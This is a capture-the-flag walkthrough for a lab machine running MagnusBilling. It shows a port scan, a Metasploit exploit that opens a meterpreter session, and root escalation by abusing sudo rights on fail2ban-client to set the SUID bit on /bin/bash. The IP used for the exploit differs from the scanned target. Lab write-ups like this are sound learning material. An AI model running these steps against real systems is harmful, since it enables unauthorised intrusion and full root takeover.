#### Target Ip :  10.201.76.54

-----------

RustScan 

rustscan -a 10.201.76.54 -- -sC -sV 

![[Pasted image 20251025174816.png]]

We found open ports :  

Open 10.201.76.54:22  
Open 10.201.76.54:80
Open 10.201.76.54:3306
Open 10.201.76.54:5038

![[Pasted image 20251025183606.png]]

These are the service running on the server.

----------------
Then we found a exploit on msf console and the service was MagnusBilling


msf > search MagnusBilling

![[Pasted image 20251025183737.png]]

msf > use 0

msf >show options

![[Pasted image 20251025184034.png]]

msf >set RHOSTS 10.201.89.202

msf >set LHOST 10.17.17.19

msf >run

Now we get the meterpreter session 

![[Pasted image 20251025184353.png]]

Then back to the home directory 

Found total 3 users 

![[Pasted image 20251025184711.png]]

So finally in the magnus user i found the user.txt flag

----------------
Now lets find the root.txt Flag

To do that we have to escalate priviellage

check which service we can use under sudo permission . Before that change the meterpreter shell to normal shell.

meterpreter > shell

sudo -l

![[Pasted image 20251025190512.png]]

we found fail2bn service that have sudo permission......

**fail2ban :** Fail2ban is an open-source intrusion prevention software for Linux that protects servers from brute-force attacks by monitoring log files for suspicious activity and automatically banning malicious IP addresses.

lets exploit these service !!!!!!!!!!

we found a exploit on https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/fail2ban-command/

# Investigation

sudo -l

# Output:

(ALL) NOPASSWD: /usr/bin/fail2ban-client

**If we can execute fail2ban-client command as root, we may be able to escalate privilege and gain a root shell.**

# Exploit : 

## step 1:
### Get jail list

```
sudo /usr/bin/fail2ban-client status
```

## step 2 : 

```
# Choose one of the jails from the "Jail list" in the output.

sudo /usr/bin/fail2ban-client get <JAIL> actions

# Create a new action with arbitrary name (e.g. "evil")

sudo /usr/bin/fail2ban-client set <JAIL> addaction evil

# Set payload to actionban

sudo /usr/bin/fail2ban-client set <JAIL> action evil actionban "chmod +s /bin/bash"

# Trigger the action

sudo /usr/bin/fail2ban-client set <JAIL> banip 1.2.3.5

# Now we gain a root

/bin/bash -p

```

![[Pasted image 20251025191756.png]]

Finnaly we got the root access.Now lest find the root.txt flag





